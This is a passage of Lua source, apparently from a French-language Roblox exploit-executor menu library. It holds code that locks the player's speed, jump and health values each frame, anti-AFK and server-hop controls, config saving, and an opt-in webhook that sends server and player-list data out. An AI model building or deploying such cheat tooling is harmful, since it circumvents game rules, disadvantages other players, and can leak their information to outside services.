            if control and control.Set then control:Set(desiredCameraMode.Name) end
        end
    end)

    connect(RunService.Heartbeat, function()
        local currentHumanoid = getHumanoid()
        if currentHumanoid then
            if speedLocked and math.abs(currentHumanoid.WalkSpeed - desiredSpeed) > 0.01 then pcall(function() currentHumanoid.WalkSpeed = desiredSpeed end) end
            local property = currentHumanoid.UseJumpPower and "JumpPower" or "JumpHeight"
            if jumpLocked and math.abs((currentHumanoid[property] or 0) - desiredJump) > 0.01 then pcall(function() currentHumanoid[property] = desiredJump end) end
            if hipHeightLocked and math.abs(currentHumanoid.HipHeight - desiredHipHeight) > 0.01 then pcall(function() currentHumanoid.HipHeight = desiredHipHeight end) end
            if maxHealthLocked and math.abs(currentHumanoid.MaxHealth - desiredMaxHealth) > 0.01 then pcall(function() currentHumanoid.MaxHealth = desiredMaxHealth end) end
            if healthLocked and math.abs(currentHumanoid.Health - math.min(desiredHealth, currentHumanoid.MaxHealth)) > 0.01 then pcall(function() currentHumanoid.Health = math.min(desiredHealth, currentHumanoid.MaxHealth) end) end
            if autoRotateLocked and currentHumanoid.AutoRotate ~= desiredAutoRotate then pcall(function() currentHumanoid.AutoRotate = desiredAutoRotate end) end
            if platformStandLocked and currentHumanoid.PlatformStand ~= desiredPlatformStand then pcall(function() currentHumanoid.PlatformStand = desiredPlatformStand end) end
        end
        local camera = Workspace.CurrentCamera
        if fovLocked and camera and math.abs(camera.FieldOfView - desiredFOV) > 0.01 then pcall(function() camera.FieldOfView = desiredFOV end) end
        if zoomLocked then
            if math.abs(LocalPlayer.CameraMinZoomDistance - desiredMinZoom) > 0.01 then pcall(function() LocalPlayer.CameraMinZoomDistance = desiredMinZoom end) end
            if math.abs(LocalPlayer.CameraMaxZoomDistance - desiredMaxZoom) > 0.01 then pcall(function() LocalPlayer.CameraMaxZoomDistance = desiredMaxZoom end) end
        end
        if cameraModeLocked and LocalPlayer.CameraMode ~= desiredCameraMode then pcall(function() LocalPlayer.CameraMode = desiredCameraMode end) end
    end)

    return tab
end

function Library:BuildMiscTab(window)
    local tab = window:MakeTab({Name = "Misc"})

    tab:AddSection({Name = "Performances"})
    tab:AddToggle({
        Name = "Render 3D",
        Default = true,
        Flag = "Misc.Render3D",
        Callback = function(value)
            pcall(function() RunService:Set3dRenderingEnabled(value == true) end)
        end,
    })
    tab:AddToggle({
        Name = "Low graphics / Anti-lag",
        Default = Library.Settings.LowGraphicsEnabled == true,
        Flag = "Misc.LowGraphics",
        Callback = function(value)
            setLowGraphics(value)
        end,
    })
    tab:AddToggle({
        Name = "Anti-AFK (activé par défaut)",
        Default = Library.Settings.AntiAFKEnabled == true,
        Flag = "Misc.AntiAFK",
        Callback = function(value)
            setAntiAFK(value)
        end,
    })

    tab:AddSection({Name = "Serveur"})
    local jobIdBox = tab:AddTextbox({
        Name = "JobId à rejoindre",
        Default = "",
        PlaceholderText = "Colle l'identifiant du serveur",
        Flag = "Misc.JoinJobId",
    })
    tab:AddMultiButton({Buttons = {
        {
            Name = "Rejoin",
            Callback = function()
                local success, err = pcall(function()
                    TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
                end)
                if not success then Library:MakeNotification({Name = "Rejoin", Content = "Échec du téléport : " .. tostring(err), Time = 4}) end
            end,
        },
        {
            Name = "Server Hop",
            Callback = function()
                local success, err = pcall(function() TeleportService:Teleport(game.PlaceId, LocalPlayer) end)
                if not success then Library:MakeNotification({Name = "Server Hop", Content = "Échec du téléport : " .. tostring(err), Time = 4}) end
            end,
        },
        {
            Name = "Leave",
            Callback = function()
                pcall(function() LocalPlayer:Kick("Vous avez quitté la partie.") end)
            end,
        },
    }})
    tab:AddMultiButton({Buttons = {
        {
            Name = "Rejoindre le JobId",
            Callback = function()
                local jobId = tostring(jobIdBox.Value or ""):gsub("^%s+", ""):gsub("%s+$", "")
                if jobId == "" then
                    Library:MakeNotification({Name = "JobId", Content = "Entre un JobId avant de continuer.", Time = 3})
                    return
                end
                local success, err = pcall(function()
                    TeleportService:TeleportToPlaceInstance(game.PlaceId, jobId, LocalPlayer)
                end)
                if not success then Library:MakeNotification({Name = "JobId", Content = "Impossible de rejoindre ce serveur : " .. tostring(err), Time = 4}) end
            end,
        },
        {
            Name = "Copier le JobId actuel",
            Callback = function()
                local clipboard = toClipboard or setclipboard or toclipboard
                if type(clipboard) ~= "function" then
                    Library:MakeNotification({Name = "JobId", Content = "La fonction presse-papiers n'est pas disponible dans cet environnement.", Time = 4})
                    return
                end
                local text = "roblox://placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. tostring(game.JobId)
                local success = pcall(function() clipboard(text) end)
                Library:MakeNotification({Name = "JobId", Content = success and "Lien du serveur copié." or "Copie impossible.", Time = 3})
            end,
        },
    }})

    tab:AddSection({Name = "Configurations locales"})
    local configNameBox = tab:AddTextbox({
        Name = "Nom de la sauvegarde",
        Default = "",
        PlaceholderText = "Ex. farm rapide",
    })
    local savedConfigDropdown = tab:AddDropdown({
        Name = "Configurations sauvegardées",
        Options = self:ListConfigs(),
        Default = nil,
    })
    local function refreshConfigs()
        savedConfigDropdown:Refresh(self:ListConfigs(), false)
    end
    tab:AddMultiButton({Buttons = {
        {
            Name = "Sauvegarder",
            Callback = function()
                local success, err = self:SaveConfig(configNameBox.Value)
                if success then
                    refreshConfigs()
                    Library:MakeNotification({Name = "Configuration", Content = "Configuration sauvegardée.", Time = 3})
                else
                    Library:MakeNotification({Name = "Configuration", Content = tostring(err or "Sauvegarde impossible."), Time = 5})
                end
            end,
        },
        {
            Name = "Charger",
            Callback = function()
                local name = savedConfigDropdown.Value
                local success, err = self:LoadConfig(name)
                Library:MakeNotification({Name = "Configuration", Content = success and ("Configuration chargée : " .. tostring(name)) or tostring(err or "Chargement impossible."), Time = 4})
            end,
        },
        {
            Name = "Supprimer",
            Callback = function()
                local name = savedConfigDropdown.Value
                local success, err = self:DeleteConfig(name)
                if success then
                    refreshConfigs()
                    Library:MakeNotification({Name = "Configuration", Content = "Configuration supprimée.", Time = 3})
                else
                    Library:MakeNotification({Name = "Configuration", Content = tostring(err or "Suppression impossible."), Time = 4})
                end
            end,
        },
    }})
    tab:AddParagraph("Compatibilité", "Les sauvegardes utilisent les fonctions de fichiers de l'exécuteur (writefile/readfile/listfiles). Si elles ne sont pas disponibles, la bibliothèque affiche une erreur au lieu de prétendre que la configuration a été enregistrée.")

    tab:AddSection({Name = "Webhook (opt-in)"})
    local webhookBox = tab:AddTextbox({
        Name = "URL du webhook",
        Default = Telemetry.Webhook,
        PlaceholderText = "Vide = URL par défaut configurée par le créateur",
        Flag = "Misc.WebhookURL",
        Callback = function(value) self:SetTelemetryWebhook(value) end,
    })
    local telemetryToggle
    telemetryToggle = tab:AddToggle({
        Name = "Activer l'envoi / heartbeat",
        Default = Telemetry.Enabled == true,
        Flag = "Misc.WebhookEnabled",
        Callback = function(value)
            if value then
                self:SetTelemetryWebhook(webhookBox.Value)
                local custom = tostring(webhookBox.Value or ""):gsub("^%s+", ""):gsub("%s+$", "")
                if custom == "" and tostring(Telemetry.DefaultWebhook or "") == "" then
                    if telemetryToggle then telemetryToggle:Set(false) end
                    Library:MakeNotification({Name = "Webhook", Content = "Aucune URL configurée. Ajoute une URL ou configure DefaultWebhook côté créateur.", Time = 5})
                    return
                end
            end
            self:SetTelemetryEnabled(value)
        end,
    })

    local keyToLabel = {
        Executor = "Utilisateur", State = "État", Target = "Cible",
        PlayerCount = "Nombre de joueurs", PlaceId = "PlaceId", GameId = "GameId",
        JobId = "JobId", Players = "Liste des joueurs", Timestamp = "Horodatage",
        Tokens = "Bonbons du compte", Phase = "Phase actuelle", Map = "Map choisie",
    }
    local labelToKey = {}
    local fieldOptions, defaultFields = {}, {}
    for _, key in ipairs(Telemetry.AllowedFields) do
        local info = GetTelemetryFieldInfo(key)
        local label = keyToLabel[key] or (info and info.Name) or key
        table.insert(fieldOptions, label)
        labelToKey[label] = key
        if Telemetry.Fields[key] == true then table.insert(defaultFields, label) end
    end
    tab:AddMultiDropdown({
        Name = "Informations envoyées",
        Options = fieldOptions,
        Default = defaultFields,
        Flag = "Misc.WebhookFields",
        Callback = function(labels)
            local keys = {}
            for _, label in ipairs(labels) do
                if labelToKey[label] then table.insert(keys, labelToKey[label]) end
            end
            self:SetTelemetryFields(keys)
        end,
    })
    tab:AddTextbox({
        Name = "Message du webhook",
        Default = Telemetry.Message,
        PlaceholderText = "Texte ajouté à l'embed (optionnel)",
        Flag = "Misc.WebhookMessage",
        Callback = function(value) self:SetTelemetryMessage(value) end,
    })
    local intervalUnit = "Minutes"
    local intervalValue = 3
    local intervalSlider
    local function updateInterval()
        local minimum = intervalUnit == "Secondes" and 5 or 1
        local maximum = intervalUnit == "Heures" and 24 or 60
        intervalValue = math.clamp(intervalValue, minimum, maximum)
        if intervalSlider and intervalSlider.Value ~= intervalValue then
            intervalSlider:Set(intervalValue, true)
        end
        local multiplier = intervalUnit == "Heures" and 3600 or (intervalUnit == "Minutes" and 60 or 1)
        self:SetTelemetryInterval(intervalValue * multiplier)
    end
    tab:AddDropdown({
        Name = "Unité d'intervalle",
        Options = {"Secondes", "Minutes", "Heures"},
        Default = intervalUnit,
        Flag = "Misc.HeartbeatUnit",
        Callback = function(value) intervalUnit = value; updateInterval() end,
    })
    intervalSlider = tab:AddSlider({
        Name = "Intervalle heartbeat",
        Min = 1,
        Max = 60,
        Default = intervalValue,
        Increment = 1,
        Flag = "Misc.HeartbeatInterval",
        Callback = function(value) intervalValue = value; updateInterval() end,
    })
    tab:AddParagraph("Confidentialité", "Aucun heartbeat n'est envoyé par défaut. Lorsque l'option est activée, seuls les champs cochés ci-dessus sont ajoutés à l'embed. Le créateur peut limiter les choix avec ConfigureWebhook({AllowedFields = {...}}). Une URL vide utilise uniquement DefaultWebhook si le créateur en a explicitement configuré une.")

    return tab
end

function Library:BuildUISettingsTab(window)
    local tab = window:MakeTab({
        Name = "UI",
    })

    tab:AddSection({Name = "Minimisation"})
    tab:AddDropdown({
        Name = "Style réduit",
        Default = window.MinimizeStyle or "Barre",
        Options = {"Barre", "Carré", "Avatar"},
        Flag = "UI.MinimizeStyle",
        Callback = function(value)
            window:SetMinimizeStyle(value)
        end,
    })
    tab:AddDropdown({
        Name = "Position en mode réduit",
        Default = window.MinimizePositionMode or "Coin supérieur gauche",
        Options = {"Coin supérieur gauche", "Centre de la fenêtre", "Coin inférieur droit"},
        Flag = "UI.MinimizePosition",
        Callback = function(value)
            window:SetMinimizePosition(value)
        end,
    })
    tab:AddParagraph("Raccourci", "Right Control minimise ou restaure le menu. Carré et Avatar peuvent être déplacés en les faisant glisser directement.")

    tab:AddSection({
        Name = "Profil",
    })

    tab:AddDropdown({
        Name = "Profil",
        Default = self.CurrentUIProfile,
        Options = {"Default", "Midnight", "Emerald", "Ocean", "Crimson"},
        Callback = function(value)
            self:ApplyUIProfile(value)
        end,
    })

    tab:AddSection({
        Name = "Couleurs",
    })

    tab:AddColorpicker({
        Name = "Couleur primaire",
        Default = self.Theme.Main,
        Callback = function(value)
            self.Theme.Main = value
            for _, window in ipairs(self.Windows) do
                if window.Main then
                    window.Main.BackgroundColor3 = value
                end
            end
        end,
    })

    tab:AddColorpicker({
        Name = "Couleur secondaire",
        Default = self.Theme.Second,
        Callback = function(value)
            self.Theme.Second = value
            for _, window in ipairs(self.Windows) do
                if window.Top then
                    window.Top.BackgroundColor3 = value
                end
                if window.Sidebar then
                    window.Sidebar.BackgroundColor3 = value
                end
                for _, patch in ipairs(window.SidebarCornerPatches or {}) do
                    if patch and patch.Parent then patch.BackgroundColor3 = value end
                end
            end
        end,
    })

    tab:AddColorpicker({
        Name = "Couleur accent",
        Default = self.Theme.Accent,
        Callback = function(value)
            self.Theme.Accent = value
        end,
    })

    tab:AddSlider({
        Name = "Transparence du fond",
        Min = 0,
        Max = 90,
        Default = math.floor((self.Settings.BackgroundTransparency or 0.50) * 100),
        Increment = 5,
        ValueName = "%",
        Callback = function(value)
            self.Settings.BackgroundTransparency = value / 100
            for _, window in ipairs(self.Windows) do
                if window.Main then
                    window.Main.BackgroundTransparency =
                        self.Settings.BackgroundTransparency
                end
            end
        end,
    })

    tab:AddSlider({
        Name = "Flou",
        Min = 0,
        Max = 100,
        Default = math.floor(
            ((self.Settings.BlurSize or 0) / 24) * 100
        ),
        Increment = 5,
        ValueName = "%",
        Callback = function(value)
            self.Settings.BlurEnabled = value > 0
            self.Settings.BlurSize = 24 * (value / 100)
            applyBlur()
        end,
    })

    tab:AddToggle({
        Name = "Activer le flou",
        Default = self.Settings.BlurEnabled == true,
        Callback = function(value)
            self.Settings.BlurEnabled = value
            applyBlur()
        end,
    })

    tab:AddParagraph(
        "Info",
        "Le BlurEffect Roblox agit sur la scène complète. "
        .. "La transparence, les couleurs et les profils restent locaux à l'interface."
    )

    return tab
end

function Library:Init()
    applyBlur()
end

function Library:Destroy()
    self:SetTelemetryEnabled(false)
    if Library._SetLowGraphics then pcall(function() Library._SetLowGraphics(false) end) end
    if Library._SetAntiAFK then pcall(function() Library._SetAntiAFK(false) end) end
    pcall(function() RunService:Set3dRenderingEnabled(true) end)
    for _, connection in ipairs(self.Connections) do
        pcall(function()
            connection:Disconnect()
        end)
    end

    table.clear(self.Connections)

    for _, window in ipairs(self.Windows) do
        pcall(function()
            window:Destroy()
        end)
    end

    table.clear(self.Windows)
    table.clear(self.Flags)
    applyBlur()
end

return Library
